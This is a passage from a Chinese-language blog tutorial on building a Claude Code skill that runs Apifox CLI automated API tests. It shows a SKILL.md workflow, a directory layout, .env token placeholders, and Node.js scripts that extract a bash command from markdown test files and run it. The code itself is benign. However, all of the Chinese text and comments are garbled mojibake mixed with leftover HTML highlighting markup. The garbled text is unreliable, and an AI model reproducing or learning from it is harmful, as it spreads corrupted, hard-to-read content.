<span class="hljs-bullet">-</span> åˆ™è¿›å…¥ <span class="hljs-strong">**æ‰¹é‡æ‰§è¡Œæ¨¡å¼**</span>

æ‰¹é‡æ‰§è¡Œæ¨¡å¼ä¸‹ï¼š
<span class="hljs-bullet">-</span> æ˜ç¡®åˆ—å‡ºå°†è¦æ‰§è¡Œçš„æµ‹è¯•åˆ—è¡¨
<span class="hljs-bullet">-</span> <span class="hljs-strong">**è¯¢é—®æ‰§è¡Œæ–¹å¼**</span>ï¼šè®©ç”¨æˆ·é€‰æ‹© â€œæŒ‰é¡ºåºæ‰§è¡Œâ€ (æ›´æ˜“è¯») æˆ– â€œå¹¶è¡Œæ‰§è¡Œâ€ (é€Ÿåº¦å¿«)ã€‚
<span class="hljs-bullet">  -</span> <span class="hljs-strong">**æŒ‰é¡ºåºæ‰§è¡Œ**</span>ï¼šé€ä¸ªè¿è¡Œæµ‹è¯•å¹¶å³æ—¶åˆ†æï¼Œé€‚åˆè°ƒè¯•ã€‚
<span class="hljs-bullet">  -</span> <span class="hljs-strong">**å¹¶è¡Œæ‰§è¡Œ**</span>ï¼šåŒæ—¶å¯åŠ¨å¤šä¸ªæµ‹è¯•ï¼ˆä½¿ç”¨ <span class="hljs-code">`&amp;`</span> ç»“å°¾æˆ–è„šæœ¬å¹¶å‘ï¼‰ï¼Œé€‚åˆå¿«é€Ÿå›å½’ï¼Œä½†æ—¥å¿—å¯èƒ½ä¼šäº¤ç»‡ã€‚
<span class="hljs-bullet">-</span> è¯·æ±‚ç”¨æˆ·ç¡®è®¤æ‰§è¡Œæ–¹å¼åŠæµ‹è¯•åˆ—è¡¨ï¼ˆæ˜¯ / å¦ï¼‰
<span class="hljs-bullet">-</span> æŒ‰é€‰æ‹©çš„æ–¹å¼æ‰§è¡Œæµ‹è¯•
<span class="hljs-bullet">-</span> æœ€ç»ˆæ±‡æ€»æˆ–ä¾æ¬¡è§£é‡Šæ¯ä¸ªæµ‹è¯•çš„ç»“æœ

<span class="hljs-bullet">3.</span> <span class="hljs-strong">**ç¡®è®¤ç¯å¢ƒ**</span>ï¼š
<span class="hljs-bullet">-</span> æ”¯æŒçš„ç¯å¢ƒåŒ…æ‹¬ï¼š
<span class="hljs-bullet">  -</span> <span class="hljs-code">`dev`</span>
<span class="hljs-bullet">  -</span> <span class="hljs-code">`test`</span>
<span class="hljs-bullet">  -</span> <span class="hljs-code">`prod`</span>
<span class="hljs-bullet">-</span> å¦‚ç”¨æˆ·æœªæ˜ç¡®æŒ‡å®šç¯å¢ƒï¼š
<span class="hljs-bullet">  -</span> åˆ—å‡ºä¸Šè¿°ç¯å¢ƒå
<span class="hljs-bullet">  -</span> è®©ç”¨æˆ·ç¡®è®¤ä½¿ç”¨å“ªä¸€ä¸ª

<span class="hljs-bullet">4.</span> <span class="hljs-strong">**æ‰§è¡Œæµ‹è¯•**</span>ï¼š
<span class="hljs-bullet">-</span> åœ¨ä»¥ä¸‹ä¿¡æ¯æ˜ç¡®åæ‰§è¡Œæµ‹è¯•ï¼š
<span class="hljs-bullet">  -</span> æµ‹è¯•æ–‡ä»¶è·¯å¾„
<span class="hljs-bullet">  -</span> ç¯å¢ƒåï¼ˆdev / test / prodï¼‰
<span class="hljs-code">```bash
node ./.claude/skills/apifox-tests/scripts/run-cli.js &lt;æµ‹è¯•æ–‡ä»¶è·¯å¾„&gt; &lt;ç¯å¢ƒå&gt;
```</span>

<span class="hljs-bullet">5.</span> <span class="hljs-strong">**è§£é‡Šç»“æœ**</span>ï¼šåˆ†æ Apifox CLI è¾“å‡ºï¼Œè§£é‡Šå¤±è´¥åŸå› 

<span class="hljs-section">## å¤±è´¥å¤„ç†</span>

<span class="hljs-bullet">-</span> ä¸ä¿®æ”¹æµ‹è¯•æ–‡ä»¶
<span class="hljs-bullet">-</span> ä¸ä¿®æ”¹æ‰§è¡Œå‘½ä»¤
<span class="hljs-bullet">-</span> åŸºäºæµ‹è¯•åç§°ã€æ¥å£è¯­ä¹‰å’Œ CLI è¾“å‡ºè§£é‡Šå¤±è´¥åŸå› 

</code></pre>
<h3 data-id="heading-14">æ­¥éª¤ 3ï¼šè¡¥å…… Skill æ‰€éœ€çš„æ”¯æŒæ–‡ä»¶</h3>
<p>åœ¨å‰é¢çš„æ­¥éª¤ä¸­ï¼Œæˆ‘ä»¬å·²ç»åˆ›å»ºäº† <code>SKILL.md</code>ï¼Œç”¨äºå®šä¹‰è¿™ä¸ª Skill çš„è§¦å‘æ¡ä»¶å’Œæ•´ä½“æ‰§è¡Œæµç¨‹ã€‚</p>
<p>åœ¨æ­¤åŸºç¡€ä¸Šï¼Œå…¶ä½™æ–‡ä»¶éƒ½åªæ˜¯å¯¹ <code>SKILL.md</code> çš„è¡¥å……ï¼Œå½“æµç¨‹ä¸­éœ€è¦å…¶å®ƒä¿¡æ¯ï¼Œæ¯”å¦‚è¿è¡Œç¯å¢ƒã€æ‰§è¡Œå‘½ä»¤æˆ–æµ‹è¯•å®šä¹‰æ—¶ï¼Œå†æŒ‰éœ€å¼•å…¥å¯¹åº”çš„æ–‡ä»¶å³å¯ã€‚</p>
<p>æœ€ç»ˆï¼Œè¿™ä¸ª Skill çš„ç›®å½•ç»“æ„å¦‚ä¸‹ï¼š</p>
<pre><code class="hljs language-shell" lang="shell">.claude/skills/apifox-tests/
â”œâ”€â”€ SKILL.md              # Skill å…¥å£ï¼Œå®šä¹‰è§¦å‘æ¡ä»¶å’Œæ•´ä½“æµç¨‹
â”œâ”€â”€ env/                  # è¿è¡Œç¯å¢ƒé…ç½®ï¼ˆå¦‚ dev / test / prodï¼‰ï¼Œç”¨äºåŒºåˆ†ä¸åŒæµ‹è¯•ç¯å¢ƒ
â”‚   â”œâ”€â”€ dev.env           # å¼€å‘ç¯å¢ƒ
â”‚   â”œâ”€â”€ test.env          # æµ‹è¯•ç¯å¢ƒ
â”‚   â””â”€â”€ prod.env          # ç”Ÿäº§ç¯å¢ƒ
â”œâ”€â”€ scripts/              # æ‰§è¡Œè„šæœ¬ï¼ˆè¢« SKILL.md è°ƒç”¨ï¼‰
â”‚   â”œâ”€â”€ list-tests.js     # åˆ—å‡º tests ç›®å½•ä¸‹çš„æ‰€æœ‰æµ‹è¯•
â”‚   â””â”€â”€ run-cli.js        # è´Ÿè´£ç»„è£…å¹¶æ‰§è¡Œ Apifox CLI å‘½ä»¤
â””â”€â”€ tests/                # æµ‹è¯•å®šä¹‰ï¼ˆæ¯ä¸ªæ–‡ä»¶å¯¹åº”ä¸€ä¸ªæµ‹è¯•åœºæ™¯æˆ–æµ‹è¯•å¥—ä»¶ï¼‰
    â”œâ”€â”€ æ”¯ä»˜æµç¨‹.md        
    â””â”€â”€ é€€æ¬¾æµç¨‹.md        
</code></pre>
<p>ä¸‹é¢åˆ†åˆ«ä»‹ç»è¿™äº›æ”¯æŒæ–‡ä»¶çš„ä½œç”¨å’Œç¤ºä¾‹ã€‚</p>
<h4 data-id="heading-15">ç¯å¢ƒé…ç½®ï¼ˆenvï¼‰</h4>
<p><code>env/</code> ç›®å½•ç”¨äºå­˜æ”¾ä¸åŒè¿è¡Œç¯å¢ƒå¯¹åº”çš„å˜é‡é…ç½®ï¼Œä¾‹å¦‚ Apifox çš„è®¿é—®ä»¤ç‰Œ <em><span>ï¼ˆAccess Tokenï¼‰</span></em> å’Œç¯å¢ƒ IDã€‚</p>
<p>å°†ç¯å¢ƒ ID æŠ½ç¦»ä¸ºå˜é‡ï¼Œå¯ä»¥è®©æˆ‘ä»¬åœ¨ä¸æ”¹ä»»ä½•å‘½ä»¤æˆ–è„šæœ¬çš„æƒ…å†µä¸‹ï¼Œå¿«é€Ÿåˆ‡æ¢æµ‹è¯•è¿è¡Œç¯å¢ƒ <em><span>ï¼ˆå¦‚å¼€å‘ / æµ‹è¯• / ç”Ÿäº§ï¼‰</span></em>ã€‚</p>
<p>ä¾‹å¦‚ï¼Œåœ¨ <code>env/</code> ç›®å½•ä¸‹åˆ›å»º <code>dev.env</code> æ–‡ä»¶ï¼š</p>
<pre><code class="hljs language-shell" lang="shell">APIFOX_ACCESS_TOKEN=APS-ä½ çš„è®¿é—®ä»¤ç‰Œ
APIFOX_ENV_ID=ä½ çš„ç¯å¢ƒID
</code></pre>
<p>å¦‚æœéœ€è¦æ”¯æŒå¤šä¸ªç¯å¢ƒï¼Œå¯ä»¥æŒ‰ç…§åŒæ ·çš„æ–¹å¼åˆ›å»ºï¼š</p>
<ul>
<li>
<p><code>test.env</code></p>
</li>
<li>
<p><code>prod.env</code></p>
</li>
<li>
<p>â€¦â€¦</p>
</li>
</ul>
<p>æ¯ä¸ªæ–‡ä»¶åªéœ€è¦ç»´æŠ¤å¯¹åº”ç¯å¢ƒçš„å˜é‡å³å¯ã€‚</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/5043873d93f44553993a4cfa350c58a1~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQXBpZm94:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768975194&amp;x-signature=hIJCeoTM7nL7oM%2BEUOreEH2RACg%3D" alt="" loading="lazy"/></p>
<p>ç¯å¢ƒ ID å¯¹åº”çš„æ˜¯ Apifox CLI å‘½ä»¤ä¸­ <code>-e</code> å‚æ•°åé¢çš„æ•°å­—ï¼Œæ¯ä¸€ä¸ªè¿è¡Œç¯å¢ƒ <em><span>ï¼ˆå¦‚å¼€å‘ã€æµ‹è¯•ã€ç”Ÿäº§ï¼‰</span></em> åœ¨ Apifox ä¸­éƒ½ä¼šæœ‰ä¸€ä¸ªå”¯ä¸€çš„ç¯å¢ƒ IDã€‚</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/c326f50f1f10494fa17a70ec046feedb~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQXBpZm94:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768975194&amp;x-signature=QuVu8rDcM%2FbLb2%2F8eFBS2ss53v8%3D" alt="" loading="lazy"/></p>
<blockquote>
<p>ğŸ’¡ <code>env/</code> ç›®å½•çš„ <code>.env</code> æ–‡ä»¶åŒ…å«è®¿é—®ä»¤ç‰Œï¼Œæ˜¯æ•æ„Ÿä¿¡æ¯ï¼Œä¸èƒ½æäº¤åˆ° Gitã€‚</p>
</blockquote>
<h4 data-id="heading-16">æ‰§è¡Œè„šæœ¬ï¼ˆscriptsï¼‰</h4>
<p><code>scripts/</code> ç›®å½•ç”¨äºå­˜æ”¾å¯ç›´æ¥æ‰§è¡Œçš„è„šæœ¬ï¼Œè´Ÿè´£æŠŠã€Œæµ‹è¯•å®šä¹‰ã€è½¬æ¢ä¸ºå®é™…å¯è¿è¡Œçš„ Apifox CLI å‘½ä»¤ï¼Œå¹¶å®Œæˆç¯å¢ƒå˜é‡æ³¨å…¥ä¸æ‰§è¡Œã€‚</p>
<p>æœ¬æ–‡ä¸­çš„ Skill é€‰æ‹©ä½¿ç”¨ Node.jsï¼Œä¸»è¦åŸºäºä¸¤ä¸ªè€ƒè™‘ï¼š</p>
<ol>
<li>
<p><strong>Apifox CLI æœ¬èº«ä¾èµ– Node.js</strong>
ç›´æ¥å¤ç”¨åŒä¸€è¿è¡Œç¯å¢ƒï¼Œæ— éœ€é¢å¤–å‡†å¤‡ Python ç­‰è¿è¡Œæ—¶ã€‚</p>
</li>
<li>
<p><strong>é™ä½ä¸Šä¸‹æ–‡è´Ÿæ‹…ï¼Œå‡å°‘ tokens æ¶ˆè€—</strong>
å°†â€œå‘½ä»¤è§£æã€å˜é‡æ³¨å…¥ã€æ‰§è¡Œé€»è¾‘â€æ”¾åœ¨è„šæœ¬ä¸­å®Œæˆï¼Œå¯ä»¥é¿å…è®© Claude åœ¨å¯¹è¯ä¸­åå¤æ‹¼è£…å®Œæ•´ CLI å‘½ä»¤ã€‚</p>
</li>
</ol>
<p>å¦‚æœä½ å¯¹è„šæœ¬ä¸ç†Ÿæ‚‰ï¼Œä¹Ÿå¯ä»¥é€‰æ‹©ä¸ä½¿ç”¨ï¼Œè€Œæ˜¯åœ¨ <code>SKILL.md</code> ä¸­ç›´æ¥è®© Claude ç»„è£…å¹¶æ‰§è¡Œ CLI å‘½ä»¤ï¼Œåªæ˜¯ä¸Šä¸‹æ–‡æˆæœ¬ä¼šæ›´é«˜ä¸€äº›ã€‚</p>
<p>åœ¨ <code>scripts/</code> ç›®å½•ä¸‹åˆ›å»º <code>run-cli.js</code>ï¼Œå®ƒçš„æ ¸å¿ƒèŒè´£æ˜¯ï¼š</p>
<ul>
<li>
<p>ä»æŒ‡å®šçš„ Markdown æµ‹è¯•æ–‡ä»¶ä¸­æå– Apifox CLI å‘½ä»¤</p>
</li>
<li>
<p>æ ¹æ®é€‰å®šçš„ç¯å¢ƒ <em><span>ï¼ˆå¦‚ </span><code>dev</code><span> / </span><code>test</code><span>ï¼‰</span></em> åŠ è½½å¯¹åº”çš„ <code>.env</code> æ–‡ä»¶</p>
</li>
<li>
<p>æ³¨å…¥ç¯å¢ƒå˜é‡åæ‰§è¡Œæµ‹è¯•</p>
</li>
</ul>
<p>å¯ç›´æ¥ä½¿ç”¨çš„ç¤ºä¾‹è„šæœ¬å¦‚ä¸‹ï¼š</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">import</span> fs <span class="hljs-keyword">from</span> <span class="hljs-string">"fs"</span>;
<span class="hljs-keyword">import</span> path <span class="hljs-keyword">from</span> <span class="hljs-string">"path"</span>;
<span class="hljs-keyword">import</span> { execSync } <span class="hljs-keyword">from</span> <span class="hljs-string">"child_process"</span>;
<span class="hljs-keyword">import</span> dotenv <span class="hljs-keyword">from</span> <span class="hljs-string">"dotenv"</span>;
<span class="hljs-keyword">import</span> { fileURLToPath } <span class="hljs-keyword">from</span> <span class="hljs-string">"url"</span>;

<span class="hljs-keyword">const</span> __filename = <span class="hljs-title function_">fileURLToPath</span>(<span class="hljs-keyword">import</span>.<span class="hljs-property">meta</span>.<span class="hljs-property">url</span>);
<span class="hljs-keyword">const</span> __dirname = path.<span class="hljs-title function_">dirname</span>(__filename);

<span class="hljs-comment">// args</span>
<span class="hljs-keyword">const</span> mdPath = process.<span class="hljs-property">argv</span>[<span class="hljs-number">2</span>];
<span class="hljs-keyword">const</span> envName = process.<span class="hljs-property">argv</span>[<span class="hljs-number">3</span>] || <span class="hljs-string">"local"</span>;

<span class="hljs-keyword">if</span> (!mdPath) {
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">error</span>(<span class="hljs-string">"âŒ ç¼ºå°‘æµ‹è¯• md æ–‡ä»¶è·¯å¾„"</span>);
    process.<span class="hljs-title function_">exit</span>(<span class="hljs-number">1</span>);
}

<span class="hljs-comment">// env è·¯å¾„ï¼šå§‹ç»ˆç›¸å¯¹ skills æœ¬èº«</span>
<span class="hljs-keyword">const</span> envPath = path.<span class="hljs-title function_">join</span>(__dirname, <span class="hljs-string">".."</span>, <span class="hljs-string">"env"</span>, <span class="hljs-string">`<span class="hljs-subst">${envName}</span>.env`</span>);

<span class="hljs-keyword">if</span> (!fs.<span class="hljs-title function_">existsSync</span>(envPath)) {
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">error</span>(<span class="hljs-string">`âŒ æœªæ‰¾åˆ°ç¯å¢ƒé…ç½®ï¼š<span class="hljs-subst">${envPath}</span>`</span>);
    process.<span class="hljs-title function_">exit</span>(<span class="hljs-number">1</span>);
}

dotenv.<span class="hljs-title function_">config</span>({ <span class="hljs-attr">path</span>: envPath });

<span class="hljs-comment">// è¯»å– md</span>
<span class="hljs-keyword">const</span> content = fs.<span class="hljs-title function_">readFileSync</span>(mdPath, <span class="hljs-string">"utf-8"</span>);
<span class="hljs-keyword">const</span> match = content.<span class="hljs-title function_">match</span>(<span class="hljs-regexp">/```bash([\s\S]*?)```/</span>);

<span class="hljs-keyword">if</span> (!match) {
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">error</span>(<span class="hljs-string">"âŒ æœªæ‰¾åˆ° bash å‘½ä»¤å—"</span>);
    process.<span class="hljs-title function_">exit</span>(<span class="hljs-number">1</span>);
}

<span class="hljs-keyword">let</span> command = match[<span class="hljs-number">1</span>].<span class="hljs-title function_">trim</span>();

<span class="hljs-comment">// å˜é‡æ›¿æ¢</span>
command = command
    .<span class="hljs-title function_">replaceAll</span>(<span class="hljs-string">"$APIFOX_ACCESS_TOKEN"</span>, process.<span class="hljs-property">env</span>.<span class="hljs-property">APIFOX_ACCESS_TOKEN</span>)
    .<span class="hljs-title function_">replaceAll</span>(<span class="hljs-string">"$APIFOX_ENV_ID"</span>, process.<span class="hljs-property">env</span>.<span class="hljs-property">APIFOX_ENV_ID</span>);

<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`â–¶ Running (<span class="hljs-subst">${envName}</span>)`</span>);
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(command);

<span class="hljs-comment">// æ‰§è¡Œ</span>
<span class="hljs-keyword">try</span> {
    <span class="hljs-title function_">execSync</span>(command, { <span class="hljs-attr">stdio</span>: <span class="hljs-string">"inherit"</span> });
} <span class="hljs-keyword">catch</span> (e) {
    <span class="hljs-comment">// Apifox CLI åœ¨æµ‹è¯•å¤±è´¥æ—¶ä¼šè¿”å›é€€å‡ºç  1</span>
    process.<span class="hljs-title function_">exit</span>(<span class="hljs-number">1</span>);
}
</code></pre>
<p>åŒæ ·åœ¨ <code>scripts/</code> ä¸‹åˆ›å»º <code>list-tests.js</code>ï¼Œç”¨äºï¼š</p>
<ul>
<li>
<p>é€’å½’æ‰«æ <code>tests/</code> ç›®å½•</p>
</li>
<li>
<p>æŸ¥æ‰¾æ‰€æœ‰ Markdown æµ‹è¯•æ–‡ä»¶</p>
</li>
<li>
<p>æå–é¦–è¡Œæè¿°ä¿¡æ¯</p>
</li>
<li>
<p>è¾“å‡ºå½“å‰æ‰€æœ‰å¯ç”¨çš„ Apifox è‡ªåŠ¨åŒ–æµ‹è¯•åˆ—è¡¨</p>
</li>
</ul>
<p>å¯ç›´æ¥ä½¿ç”¨çš„ç¤ºä¾‹è„šæœ¬å¦‚ä¸‹ï¼š</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">import</span> fs <span class="hljs-keyword">from</span> <span class="hljs-string">"fs"</span>;
<span class="hljs-keyword">import</span> path <span class="hljs-keyword">from</span> <span class="hljs-string">"path"</span>;
<span class="hljs-keyword">import</span> { fileURLToPath } <span class="hljs-keyword">from</span> <span class="hljs-string">"url"</span>;

<span class="hljs-keyword">const</span> __filename = <span class="hljs-title function_">fileURLToPath</span>(<span class="hljs-keyword">import</span>.<span class="hljs-property">meta</span>.<span class="hljs-property">url</span>);
<span class="hljs-keyword">const</span> __dirname = path.<span class="hljs-title function_">dirname</span>(__filename);
<span class="hljs-keyword">const</span> testsDir = path.<span class="hljs-title function_">join</span>(__dirname, <span class="hljs-string">".."</span>, <span class="hljs-string">"tests"</span>);

<span class="hljs-keyword">function</span> <span class="hljs-title function_">scan</span>(<span class="hljs-params">dir, relativePath = <span class="hljs-string">""</span></span>) {
    <span class="hljs-keyword">const</span> items = fs.<span class="hljs-title function_">readdirSync</span>(dir, { <span class="hljs-attr">withFileTypes</span>: <span class="hljs-literal">true</span> });
    
    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">const</span> item <span class="hljs-keyword">of</span> items) {
        <span class="hljs-keyword">const</span> fullPath = path.<span class="hljs-title function_">join</span>(dir, item.<span class="hljs-property">name</span>);
        <span class="hljs-keyword">const</span> relPath = path.<span class="hljs-title function_">join</span>(relativePath, item.<span class="hljs-property">name</span>);
        
        <span class="hljs-keyword">if</span> (item.<span class="hljs-title function_">isDirectory</span>()) {
            <span class="hljs-title function_">scan</span>(fullPath, relPath);
        } <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (item.<span class="hljs-property">name</span>.<span class="hljs-title function_">endsWith</span>(<span class="hljs-string">".md"</span>)) {
            <span class="hljs-keyword">try</span> {
                <span class="hljs-keyword">const</span> content = fs.<span class="hljs-title function_">readFileSync</span>(fullPath, <span class="hljs-string">"utf-8"</span>);
                <span class="hljs-keyword">const</span> firstLine = content.<span class="hljs-title function_">split</span>(<span class="hljs-string">"\n"</span>)[<span class="hljs-number">0</span>].<span class="hljs-title function_">trim</span>();
                <span class="hljs-keyword">const</span> description = firstLine.<span class="hljs-title function_">startsWith</span>(<span class="hljs-string">"&gt;"</span>) 
                    ? firstLine.<span class="hljs-title function_">replace</span>(<span class="hljs-regexp">/^&gt;\s*/</span>, <span class="hljs-string">""</span>).<span class="hljs-title function_">trim</span>() 
                    : <span class="hljs-string">"æ— æè¿°"</span>;
                <span class="hljs-keyword">const</span> displayPath = path.<span class="hljs-title function_">join</span>(<span class="hljs-string">"./.claude/skills/apifox-tests/tests"</span>, relPath);
                <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`[<span class="hljs-subst">${displayPath}</span>] - <span class="hljs-subst">${description}</span>`</span>);
            } <span class="hljs-keyword">catch</span> (err) {
                <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`[<span class="hljs-subst">${relPath}</span>] - (æ— æ³•è¯»å–å†…å®¹)`</span>);
            }
        }
    }
}

<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"ğŸ” å¯ç”¨çš„ Apifox è‡ªåŠ¨åŒ–æµ‹è¯•åˆ—è¡¨ï¼š"</span>);
<span class="hljs-keyword">if</span> (fs.<span class="hljs-title function_">existsSync</span>(testsDir)) {
    <span class="hljs-title function_">scan</span>(testsDir);
} <span class="hljs-keyword">else</span> {
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"âŒ æœªæ‰¾åˆ° tests ç›®å½•"</span>);
}

</code></pre>
<h4 data-id="heading-17">æµ‹è¯•å®šä¹‰ï¼ˆtestsï¼‰</h4>
<p><code>tests/</code> ç›®å½•ç”¨äºå­˜æ”¾æµ‹è¯•æ–‡ä»¶ï¼Œé‡‡ç”¨ Markdown ç¼–å†™ã€‚</p>
<p>è®¾è®¡åŸåˆ™ï¼šä¸€ä¸ª Markdown æ–‡ä»¶å¯¹åº”ä¸€ä¸ª Apifox æµ‹è¯•åœºæ™¯æˆ–æµ‹è¯•å¥—ä»¶ã€‚ä½ å¯ä»¥ç›´æ¥å¤ç”¨ Apifox è‡ªåŠ¨åŒ–æµ‹è¯•ä¸­å·²æœ‰çš„ç›®å½•ç»“æ„ã€æµ‹è¯•åœºæ™¯æˆ–æµ‹è¯•å¥—ä»¶åç§°ï¼Œä»¥åŠæè¿°ä¿¡æ¯ã€‚</p>
<p>æ¯ä¸ª Markdown æ–‡ä»¶åªéœ€åŒ…å«ä¸¤éƒ¨åˆ†å†…å®¹ï¼šä¸€æ®µç®€çŸ­çš„æµ‹è¯•è¯´æ˜ï¼Œä»¥åŠä¸€æ¡å¯ç›´æ¥æ‰§è¡Œçš„ Apifox CLI å‘½ä»¤ã€‚</p>
<p>Apifox CLI å‘½ä»¤é‡Œçš„ Access Token å’Œ <code>-e</code> å‚æ•°åé¢çš„ç¯å¢ƒ IDï¼Œåˆ†åˆ«ç”¨ <code>$APIFOX_ACCESS_TOKEN</code> å’Œ<code> $APIFOX_ENV_ID</code> ä»£æ›¿ï¼Œå¹¶ç»Ÿä¸€åœ¨ <code>.env</code> æ–‡ä»¶ä¸­é…ç½®ï¼Œè¿™æ ·æ—¢å¯ä»¥é¿å… token æ³„éœ²ï¼Œä¹Ÿèƒ½çµæ´»åˆ‡æ¢è¿è¡Œç¯å¢ƒã€‚ä¸€ä¸ª<code>ç™»å½•é‰´æƒ-è®¤è¯æµç¨‹.md</code>æ–‡ä»¶çš„å†…å®¹ç¤ºä¾‹ï¼š</p>
<pre><code class="hljs language-markdown" lang="markdown"><span class="hljs-quote">&gt; éªŒè¯ç™»å½•ã€åˆ·æ–° tokenã€ç™»å‡ºç­‰æ ¸å¿ƒæ¥å£æ˜¯å¦å¯ç”¨ã€‚</span>

<span class="hljs-code">```bash
apifox run --access-token $APIFOX_ACCESS_TOKEN -t 5564xxx -e $APIFOX_ENV_ID -n 1 -r html,cli
```</span>
</code></pre>
<p>åˆ°è¿™ä¸€æ­¥ï¼Œæˆ‘ä»¬çš„ Skills ç®—æ˜¯æ„å»ºå®Œäº†ï¼Œå¯ä»¥å‚è€ƒä¸€ä¸‹ç»“æ„ï¼Œå¯¹æ¯”ä¸€ä¸‹ä¸ä½ çš„æœ‰ä»€ä¹ˆä¸åŒï¼š</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/6348eccc23cd4b28984b5db6db91a65d~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQXBpZm94:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768975194&amp;x-signature=Y%2F9LDUhj66xhOHyx8OTYlX9ZR6A%3D" alt="" loading="lazy"/></p>
<h2 data-id="heading-18">åœ¨ Claude Code ä¸­ä½¿ç”¨</h2>
<p>é…ç½®å®Œæˆåï¼Œåœ¨ç»ˆç«¯æ§åˆ¶å°è¿è¡Œ <code>claude</code> å‘½ä»¤è¿›å…¥é¡¹ç›®ç›®å½•ã€‚Claude ä¼šè‡ªåŠ¨æ‰«æ <code>.claude/skills/</code> ç›®å½•ï¼Œå‘ç° <code>apifox-tests</code> Skillã€‚</p>
<p>ä½ ä¹Ÿå¯ä»¥å…ˆç”¨ <code>/skills</code> å‘½ä»¤æŸ¥çœ‹å·²åŠ è½½çš„ Skillã€‚</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/7237fc8d3bf8403da06e3995d2d3d504~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQXBpZm94:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768975194&amp;x-signature=JkQVw60%2BKH2RFHMMOtMFKBuxJ1k%3D" alt="" loading="lazy"/></p>
<p>ç„¶åï¼Œå¯ä»¥è¯•ç€è¯´ä¸€å¥è‡ªç„¶è¯­è¨€æŒ‡ä»¤ï¼Œä¾‹å¦‚ï¼šâ€œå¸®æˆ‘è·‘ä¸€ä¸‹é€€æ¬¾æµç¨‹çš„æµ‹è¯•ï¼Œç”¨æµ‹è¯•ç¯å¢ƒ â€ã€‚</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/e9fabb35ab4b47389b3eceb0ae0f96d7~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQXBpZm94:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768975194&amp;x-signature=q32fNpWMMWnBkgo8UL2d48jiAsk%3D" alt="" loading="lazy"/></p>
<p>Claude ä¼šç†è§£ä½ çš„æ„å›¾ï¼Œæ‰¾åˆ°å¯¹åº”çš„æµ‹è¯•æ–‡ä»¶å¹¶æ‰§è¡Œæµ‹è¯•ã€‚åœ¨æ‰§è¡Œè¿‡ç¨‹ä¸­ï¼Œä½ ä¼šçœ‹åˆ° Apifox CLI çš„è¾“å‡ºï¼›æµ‹è¯•å®Œæˆåï¼ŒClaude ä¼šå¯¹ç»“æœè¿›è¡Œåˆ†æå¹¶ç»™å‡ºæ€»ç»“ã€‚</p>
<p>æ•´ä¸ªæµç¨‹æ¦‚è¿°èµ·æ¥å°±æ˜¯ï¼Œä½ ç”¨è‡ªç„¶è¯­è¨€æè¿°éœ€æ±‚ï¼ŒClaude ç†è§£æ„å›¾å¹¶è°ƒç”¨è„šæœ¬ï¼Œè„šæœ¬æ‰§è¡Œ Apifox CLI å‘½ä»¤ï¼ŒClaude åˆ†æç»“æœå¹¶åé¦ˆç»™ä½ ã€‚</p>
<h2 data-id="heading-19">æ€»ç»“</h2>
<p>æœ¬æ–‡ä»‹ç»äº†å¦‚ä½•é€šè¿‡ Claude Codeã€Apifox CLI å’Œ Claude Skills æ„å»ºè‡ªåŠ¨åŒ–æµ‹è¯•å·¥ä½œæµã€‚æ ¸å¿ƒæ€æƒ³æ˜¯è®© Claude æˆä¸ºä½ å’Œå·¥å…·ä¹‹é—´çš„æ¡¥æ¢ã€‚ä½ ç”¨è‡ªç„¶è¯­è¨€æè¿°éœ€æ±‚ï¼ŒClaude ç†è§£æ„å›¾åè°ƒç”¨è„šæœ¬ï¼Œè„šæœ¬æ‰§è¡Œå…·ä½“å·¥ä½œï¼ŒClaude æŠŠç»“æœæ•´ç†æˆæ˜“è¯»çš„å½¢å¼åé¦ˆç»™ä½ ã€‚</p>
<p>è¦è®©è¿™å¥—æ–¹æ¡ˆçœŸæ­£å‘æŒ¥ä½œç”¨ï¼Œéœ€è¦æ ¹æ®é¡¹ç›®ç‰¹ç‚¹è°ƒæ•´é…ç½®ã€‚æ¯”å¦‚æµ‹è¯•çš„ç»„ç»‡æ–¹å¼ã€ç¯å¢ƒçš„ç®¡ç†ç­–ç•¥ã€ç»“æœçš„åˆ†æé€»è¾‘ç­‰ã€‚å¥½åœ¨è¿™å¥—æ–¹æ¡ˆå„ä¸ªéƒ¨åˆ†éƒ½å¯ä»¥å®šåˆ¶ï¼Œå¯ä»¥æ ¹æ®éœ€è¦æ·»åŠ æ–°åŠŸèƒ½æˆ–ä¿®æ”¹ç°æœ‰é€»è¾‘ã€‚</p>
